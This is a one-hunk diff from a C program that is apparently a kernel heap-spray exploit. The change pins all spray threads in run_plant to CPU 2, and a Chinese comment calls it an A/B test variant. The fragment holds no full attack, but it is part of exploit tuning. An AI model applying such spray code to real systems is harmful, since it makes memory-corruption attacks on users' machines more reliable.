@@ -2595,7 +2595,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             args[i].payload = payload;
             args[i].sock_first = i * per;
             args[i].sock_count = per;
-            args[i].cpu = i;
+            args[i].cpu = 2; /* A/B v9b: 全部喷线程 pin CPU2 */
             args[i].idx = i;
             atomic_store(&g_spray_tids[i], -1);
             if (pthread_create(&th[i], NULL, spray_thread, &args[i]))
